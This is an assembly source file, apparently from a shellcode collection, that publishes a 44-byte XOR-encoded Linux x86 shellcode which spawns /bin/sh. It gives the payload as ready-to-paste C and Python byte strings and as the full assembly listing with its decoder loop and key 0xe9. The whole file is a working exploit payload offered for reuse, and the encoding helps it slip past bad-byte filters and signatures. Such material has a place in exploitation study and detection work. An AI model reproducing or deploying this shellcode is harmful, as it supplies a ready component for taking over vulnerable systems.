;================================================================================
; The MIT License
;
; Copyright (c) <year> <copyright holders>
;
; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:
;
; The above copyright notice and this permission notice shall be included in
; all copies or substantial portions of the Software.
;
; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
; THE SOFTWARE.
;================================================================================
; Name : Encrypt Linux x86 Shellcode(44 Bytes) To exceve("/bin/sh")
; Author : WangYihang
; Email : wangyihanger@gmail.com
; Tested on: Linux_x86
; Shellcode Length: 44
;================================================================================
; Shellcode :
; char shellcode[] = "\xeb\x10\x5e\x31\xc9\xb1\x15\x8a"
; "\x06\x34\xe9\x88\x06\x46\xe2\xf7"
; "\xeb\x05\xe8\xeb\xff\xff\xff\xd8"
; "\x20\xb8\x81\xc6\xc6\x9a\x81\x81"
; "\xc6\x8b\x80\x87\x60\x0a\x83\xe2"
; "\xb1\x70\x24\x69";
;================================================================================
; Python :
; shellcode = "\xeb\x10\x5e\x31\xc9\xb1\x15\x8a\x06\x34\xe9\x88\x06\x46\xe2\xf7\xeb\x05\xe8\xeb\xff\xff\xff\xd8\x20\xb8\x81\xc6\xc6\x9a\x81\x81\xc6\x8b\x80\x87\x60\x0a\x83\xe2\xb1\x70\x24\x69"
;================================================================================
; Assembly language code :

global _start
; this shell code will xor every byte of 'jocker' segment , then execute them
; password is 0xe9 (233)
_start:
jmp jocker
loader:
pop esi ; get address of encrypted shellcode
xor ecx, ecx
mov cl, 21 ; loop times (length of encrypt shellcode)
decrypt:
mov al, [esi]
xor al, 0e9H
mov [esi], al
inc esi
loop decrypt
jmp encrypt

jocker:
call loader
encrypt:
db 0d8H
db 20H
db 0b8H
db 81H
db 0c6H
db 0c6H
db 9aH
db 81H
db 81H
db 0c6H
db 8bH
db 80H
db 87H
db 60H
db 0aH
db 83H
db 0e2H
db 0b1H
db 70H
db 24H
db 69H
;================================================================================